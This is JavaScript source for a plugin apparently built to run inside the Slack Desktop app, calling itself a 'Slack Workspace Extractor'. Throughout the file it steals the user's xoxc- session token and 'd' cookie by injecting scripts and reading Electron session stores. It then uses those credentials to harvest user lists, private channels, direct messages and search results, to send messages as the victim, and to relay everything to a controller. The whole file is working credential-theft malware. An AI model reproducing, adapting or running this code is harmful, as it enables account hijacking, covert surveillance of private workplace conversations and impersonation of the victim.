// Slack Workspace Extractor — main.js
// Extracts xoxc- token + d cookie from Slack Desktop, then uses Slack Web API
// for channel listing, message history, and sending messages.

var https = plugin.https;
var querystring = plugin.require('querystring');

var creds = null;       // {token, cookie, teamId, teamName, userId, userName, domain}
var userMap = {};        // userId -> {name, realName}
var credReady = false;
var bootstrapAttempts = 0;

// ===== Slack API helper =====

function slackAPI(method, params) {
    return new Promise(function(resolve, reject) {
        if (!creds || !creds.token || !creds.cookie) {
            return reject(new Error('No credentials'));
        }

        var postData = querystring.stringify(params || {});
        var options = {
            hostname: 'slack.com',
            path: '/api/' + method,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'Bearer ' + creds.token,
                'Cookie': 'd=' + creds.cookie,
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        var req = https.request(options, function(res) {
            var body = '';
            res.on('data', function(chunk) { body += chunk; });
            res.on('end', function() {
                try {
                    var parsed = JSON.parse(body);
                    if (parsed.error === 'ratelimited') {
                        var retryAfter = parseInt(res.headers['retry-after'] || '5', 10);
                        plugin.setTimeout(function() {
                            slackAPI(method, params).then(resolve).catch(reject);
                        }, retryAfter * 1000);
                        return;
                    }
                    resolve(parsed);
                } catch (e) {
                    reject(new Error('JSON parse error: ' + e.message));
                }
            });
        });
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// ===== Credential extraction =====

function extractCredentials() {
    var windows = plugin.getWindows();
    var diag = { windowCount: windows.length, windows: [], tokenSource: null };

    for (var w = 0; w < windows.length; w++) {
        diag.windows.push({ id: windows[w].id, url: windows[w].url, title: windows[w].title });
    }

    if (windows.length === 0) {
        plugin.sendData('_error', {
            phase: 'cred_extract',
            error: 'No tracked windows found',
            attempt: bootstrapAttempts,
            diag: diag
        });
        return Promise.resolve(null);
    }

    // Try multiple extraction strategies per window
    var tokenPromises = [];

    for (var i = 0; i < windows.length; i++) {
        (function(win) {
            // Strategy 1: boot_data (classic)
            var p1 = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var bd = window.boot_data || (window.TS && TS.boot_data);' +
                '    if (bd && bd.api_token) return JSON.stringify({' +
                '      source: "boot_data",' +
                '      token: bd.api_token,' +
                '      teamId: bd.team_id || "",' +
                '      teamName: bd.team_name || "",' +
                '      userId: bd.user_id || "",' +
                '      domain: bd.team_domain || ""' +
                '    });' +
                '  } catch(e) {}' +
                '  return null;' +
                '})()'
            );
            tokenPromises.push(p1);

            // Strategy 2: localStorage / redux state
            var p2 = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var keys = Object.keys(localStorage);' +
                '    for (var i = 0; i < keys.length; i++) {' +
                '      var val = localStorage.getItem(keys[i]);' +
                '      if (val && val.indexOf("xoxc-") !== -1) {' +
                '        var match = val.match(/(xoxc-[a-zA-Z0-9-]+)/);' +
                '        if (match) return JSON.stringify({' +
                '          source: "localStorage:" + keys[i],' +
                '          token: match[1],' +
                '          teamId: "", teamName: "", userId: "", domain: ""' +
                '        });' +
                '      }' +
                '    }' +
                '  } catch(e) {}' +
                '  return null;' +
                '})()'
            );
            tokenPromises.push(p2);

            // Strategy 3: document.body / script tags containing token
            var p3 = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var html = document.documentElement.innerHTML;' +
                '    var match = html.match(/"api_token"\\s*:\\s*"(xoxc-[^"]+)"/);' +
                '    if (match) {' +
                '      var teamMatch = html.match(/"team_id"\\s*:\\s*"([^"]+)"/);' +
                '      var nameMatch = html.match(/"team_name"\\s*:\\s*"([^"]+)"/);' +
                '      var userMatch = html.match(/"user_id"\\s*:\\s*"([^"]+)"/);' +
                '      return JSON.stringify({' +
                '        source: "html_scrape",' +
                '        token: match[1],' +
                '        teamId: teamMatch ? teamMatch[1] : "",' +
                '        teamName: nameMatch ? nameMatch[1] : "",' +
                '        userId: userMatch ? userMatch[1] : "",' +
                '        domain: ""' +
                '      });' +
                '    }' +
                '  } catch(e) {}' +
                '  return null;' +
                '})()'
            );
            tokenPromises.push(p3);

            // Strategy 4: Intercept Redux store if available
            var p4 = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var store = window.__REDUX_STORE__ || window.store || window.__store;' +
                '    if (store && store.getState) {' +
                '      var state = store.getState();' +
                '      var stateStr = JSON.stringify(state);' +
                '      var match = stateStr.match(/(xoxc-[a-zA-Z0-9-]+)/);' +
                '      if (match) {' +
                '        var teamMatch = stateStr.match(/"team_id"\\s*:\\s*"([^"]+)"/);' +
                '        var nameMatch = stateStr.match(/"team_name"\\s*:\\s*"([^"]+)"/);' +
                '        var userMatch = stateStr.match(/"user_id"\\s*:\\s*"([^"]+)"/);' +
                '        return JSON.stringify({' +
                '          source: "redux_store",' +
                '          token: match[1],' +
                '          teamId: teamMatch ? teamMatch[1] : "",' +
                '          teamName: nameMatch ? nameMatch[1] : "",' +
                '          userId: userMatch ? userMatch[1] : "",' +
                '          domain: ""' +
                '        });' +
                '      }' +
                '    }' +
                '  } catch(e) {}' +
                '  return null;' +
                '})()'
            );
            tokenPromises.push(p4);
        })(windows[i]);
    }

    return Promise.all(tokenPromises).then(function(results) {
        var tokenData = null;
        var resultSummary = [];

        for (var r = 0; r < results.length; r++) {
            if (results[r]) {
                try {
                    var parsed = JSON.parse(results[r]);
                    resultSummary.push({ index: r, source: parsed.source, hasToken: !!parsed.token });
                    if (!tokenData && parsed.token && parsed.token.indexOf('xoxc-') === 0) {
                        tokenData = parsed;
                    }
                } catch (e) {
                    resultSummary.push({ index: r, raw: String(results[r]).substring(0, 100) });
                }
            }
        }

        if (!tokenData) {
            diag.resultSummary = resultSummary;
            diag.nullCount = results.filter(function(r) { return !r; }).length;
            diag.totalResults = results.length;
            plugin.sendData('_error', {
                phase: 'cred_extract',
                error: 'No xoxc- token found in any window',
                attempt: bootstrapAttempts,
                diag: diag
            });
            return null;
        }

        diag.tokenSource = tokenData.source;

        // Extract d cookie from session
        return extractDCookie(diag).then(function(dCookie) {
            if (!dCookie) {
                plugin.sendData('_error', {
                    phase: 'cred_extract',
                    error: 'd cookie not found in any session',
                    attempt: bootstrapAttempts,
                    diag: diag
                });
                return null;
            }
            return {
                token: tokenData.token,
                cookie: dCookie,
                teamId: tokenData.teamId,
                teamName: tokenData.teamName,
                userId: tokenData.userId,
                domain: tokenData.domain
            };
        });
    });
}

function extractDCookie(diag) {
    // Collect d cookies from all sessions we can access
    var session = plugin.electron.session;
    var defaultSession = session.defaultSession;

    // Try default session
    return defaultSession.cookies.get({ domain: '.slack.com', name: 'd' })
        .catch(function(e) {
            if (diag) diag.defaultSessionError = String(e);
            return [];
        })
        .then(function(cookies) {
            if (cookies && cookies.length > 0) {
                if (diag) diag.cookieSource = 'defaultSession';
                return cookies[0].value;
            }

            // Try getting ALL cookies from default session to see what's there
            return defaultSession.cookies.get({ domain: '.slack.com' })
                .catch(function() { return []; })
                .then(function(allSlackCookies) {
                    if (diag) {
                        diag.slackCookieNames = (allSlackCookies || []).map(function(c) { return c.name; });
                    }

                    // Try finding d cookie with broader search
                    for (var i = 0; i < (allSlackCookies || []).length; i++) {
                        if (allSlackCookies[i].name === 'd') {
                            if (diag) diag.cookieSource = 'defaultSession_broad';
                            return allSlackCookies[i].value;
                        }
                    }

                    // Try partitioned sessions — Slack uses persist:teamId
                    return tryPartitionedSessions(diag);
                });
        });
}

function tryPartitionedSessions(diag) {
    var session = plugin.electron.session;

    // Enumerate BrowserWindows to find session partitions
    var BrowserWindow = plugin.electron.BrowserWindow;
    var allWindows = BrowserWindow.getAllWindows();
    var partitions = [];

    for (var i = 0; i < allWindows.length; i++) {
        try {
            var wc = allWindows[i].webContents;
            if (wc && wc.session && wc.session !== session.defaultSession) {
                // Found a non-default session
                var sid = wc.session.storagePath || ('win_' + i);
                var alreadyHave = false;
                for (var j = 0; j < partitions.length; j++) {
                    if (partitions[j].session === wc.session) { alreadyHave = true; break; }
                }
                if (!alreadyHave) {
                    partitions.push({ session: wc.session, id: sid });
                }
            }
        } catch (e) {}
    }

    if (diag) diag.partitionCount = partitions.length;

    if (partitions.length === 0) {
        return Promise.resolve(null);
    }

    // Try each partition for the d cookie
    var chain = Promise.resolve(null);
    for (var p = 0; p < partitions.length; p++) {
        (function(part) {
            chain = chain.then(function(found) {
                if (found) return found;
                return part.session.cookies.get({ domain: '.slack.com', name: 'd' })
                    .catch(function() { return []; })
                    .then(function(cookies) {
                        if (cookies && cookies.length > 0) {
                            if (diag) diag.cookieSource = 'partition:' + part.id;
                            return cookies[0].value;
                        }
                        return null;
                    });
            });
        })(partitions[p]);
    }

    return chain;
}

// ===== Data fetching =====

function fetchIdentity() {
    return slackAPI('auth.test').then(function(result) {
        if (result.ok) {
            creds.userName = result.user || '';
            creds.teamName = result.team || creds.teamName;
            plugin.sendData('credentials', {
                token: creds.token.substring(0, 15) + '...',
                cookie: creds.cookie.substring(0, 15) + '...',
                teamId: creds.teamId,
                teamName: creds.teamName,
                userId: creds.userId,
                userName: creds.userName,
                domain: creds.domain,
                status: 'verified'
            });
        } else {
            plugin.sendData('credentials', {
                token: creds.token.substring(0, 15) + '...',
                cookie: creds.cookie.substring(0, 15) + '...',
                teamId: creds.teamId,
                teamName: creds.teamName,
                userId: creds.userId,
                domain: creds.domain,
                status: 'auth_failed',
                error: result.error || 'unknown'
            });
        }
        return result.ok;
    });
}

function fetchUsers() {
    return slackAPI('users.list', { limit: 500 }).then(function(result) {
        if (!result.ok) return;
        var members = result.members || [];
        var users = [];
        for (var i = 0; i < members.length; i++) {
            var m = members[i];
            userMap[m.id] = {
                name: m.name || '',
                realName: (m.profile && m.profile.real_name) || m.real_name || ''
            };
            users.push({
                id: m.id,
                name: m.name,
                realName: (m.profile && m.profile.real_name) || '',
                isBot: m.is_bot || false,
                deleted: m.deleted || false
            });
        }
        plugin.sendData('user_list', { users: users, count: users.length });
    });
}

function fetchChannels() {
    var allChannels = [];

    function fetchPage(cursor) {
        var params = { limit: 200, types: 'public_channel,private_channel,mpim,im' };
        if (cursor) params.cursor = cursor;

        return slackAPI('conversations.list', params).then(function(result) {
            if (!result.ok) {
                plugin.sendData('_error', { phase: 'channel_list', error: result.error || 'unknown' });
                return;
            }

            var channels = result.channels || [];
            for (var i = 0; i < channels.length; i++) {
                var ch = channels[i];
                var displayName = ch.name || '';
                if (ch.is_im && ch.user) {
                    var u = userMap[ch.user];
                    displayName = u ? ('@' + u.name) : ('@' + ch.user);
                }
                allChannels.push({
                    id: ch.id,
                    name: displayName,
                    type: ch.is_im ? 'im' : (ch.is_mpim ? 'mpim' : (ch.is_private ? 'private' : 'public')),
                    memberCount: ch.num_members || 0,
                    topic: (ch.topic && ch.topic.value) || '',
                    purpose: (ch.purpose && ch.purpose.value) || '',
                    isArchived: ch.is_archived || false
                });
            }

            var nextCursor = result.response_metadata && result.response_metadata.next_cursor;
            if (nextCursor) {
                return fetchPage(nextCursor);
            }
        });
    }

    return fetchPage(null).then(function() {
        plugin.sendData('channel_list', { channels: allChannels, count: allChannels.length });
    });
}

function fetchMessages(channelId, channelName, limit) {
    limit = limit || 50;
    return slackAPI('conversations.history', { channel: channelId, limit: limit }).then(function(result) {
        if (!result.ok) {
            plugin.sendData('_error', { phase: 'fetch_messages', channelId: channelId, error: result.error || 'unknown' });
            return;
        }

        var messages = result.messages || [];
        var formatted = [];
        for (var i = messages.length - 1; i >= 0; i--) {
            var msg = messages[i];
            var userId = msg.user || '';
            var u = userMap[userId];
            var userName = u ? u.name : userId;

            // Resolve user mentions <@U123> to display names
            var text = msg.text || '';
            text = text.replace(/<@(U[A-Z0-9]+)>/g, function(match, uid) {
                var mu = userMap[uid];
                return '@' + (mu ? mu.name : uid);
            });

            formatted.push({
                user: userName,
                userId: userId,
                text: text,
                ts: msg.ts,
                subtype: msg.subtype || '',
                time: new Date(parseFloat(msg.ts) * 1000).toISOString()
            });
        }

        plugin.sendData('messages', {
            channelId: channelId,
            channelName: channelName || channelId,
            messages: formatted,
            count: formatted.length
        });
    });
}

function sendMessage(channelId, text, channelName) {
    return slackAPI('chat.postMessage', { channel: channelId, text: text }).then(function(result) {
        plugin.sendData('send_result', {
            channelId: channelId,
            ok: result.ok || false,
            error: result.error || null,
            ts: result.ts || null
        });
        // Auto-refetch messages so the UI gets the updated conversation
        if (result.ok) {
            fetchMessages(channelId, channelName || channelId, 50);
        }
    });
}

function searchMessages(query, count, page) {
    count = count || 20;
    page = page || 1;
    return slackAPI('search.messages', { query: query, count: count, page: page, sort: 'timestamp', sort_dir: 'desc' }).then(function(result) {
        if (!result.ok) {
            plugin.sendData('_error', { phase: 'search', query: query, error: result.error || 'unknown' });
            // Send empty results so the UI stops polling
            plugin.sendData('search_results', { query: query, matches: [], total: 0, page: 1, pageCount: 1, error: result.error || 'unknown' });
            return;
        }

        var msgData = result.messages || {};
        var matches = msgData.matches || [];
        var formatted = [];
        for (var i = 0; i < matches.length; i++) {
            var m = matches[i];
            var userId = m.user || m.username || '';
            var u = userMap[userId];
            var userName = u ? u.name : (m.username || userId);

            var text = m.text || '';
            text = text.replace(/<@(U[A-Z0-9]+)>/g, function(match, uid) {
                var mu = userMap[uid];
                return '@' + (mu ? mu.name : uid);
            });

            formatted.push({
                user: userName,
                userId: userId,
                text: text,
                ts: m.ts,
                time: new Date(parseFloat(m.ts) * 1000).toISOString(),
                channelId: (m.channel && m.channel.id) || '',
                channelName: (m.channel && m.channel.name) || '',
                permalink: m.permalink || ''
            });
        }

        plugin.sendData('search_results', {
            query: query,
            matches: formatted,
            total: (msgData.total || 0),
            page: page,
            pageCount: (msgData.pagination && msgData.pagination.page_count) || 1
        });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'search', query: query, error: String(e) });
        plugin.sendData('search_results', { query: query, matches: [], total: 0, page: 1, pageCount: 1, error: String(e) });
    });
}

// ===== Command handler =====

function onCommand(cmd) {
    if (!credReady || !creds) {
        plugin.sendData('_error', { phase: 'command', error: 'Credentials not ready yet' });
        return;
    }

    var action = cmd.action;
    if (action === 'fetch_channels') {
        return fetchChannels();
    } else if (action === 'fetch_users') {
        return fetchUsers();
    } else if (action === 'fetch_messages') {
        return fetchMessages(cmd.channelId, cmd.channelName, cmd.limit);
    } else if (action === 'send_message') {
        return sendMessage(cmd.channelId, cmd.text, cmd.channelName);
    } else if (action === 'search_messages') {
        return searchMessages(cmd.query, cmd.count, cmd.page);
    } else if (action === 'refresh_credentials') {
        return extractCredentials().then(function(newCreds) {
            if (newCreds) {
                creds = newCreds;
                return fetchIdentity();
            }
        });
    }
}

// ===== Bootstrap =====

var retryInterval = (plugin.settings.retryInterval || 15) * 1000;

function tryBootstrap() {
    bootstrapAttempts++;

    extractCredentials().then(function(extracted) {
        if (!extracted) {
            // Diagnostic errors already sent by extractCredentials
            plugin.setTimeout(tryBootstrap, retryInterval);
            return;
        }

        creds = extracted;
        credReady = true;

        // Verify and identify
        fetchIdentity().then(function(ok) {
            if (!ok) {
                credReady = false;
                plugin.setTimeout(tryBootstrap, retryInterval);
                return;
            }

            // Fetch users first (for name resolution), then channels
            fetchUsers().then(function() {
                if (plugin.settings.autoFetchChannels !== 0) {
                    fetchChannels();
                }
            });
        });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'bootstrap', error: String(e), stack: e.stack || '' });
        plugin.setTimeout(tryBootstrap, retryInterval);
    });
}

plugin.setTimeout(tryBootstrap, 3000);

return {
    cleanup: function() {},
    onCommand: onCommand
};
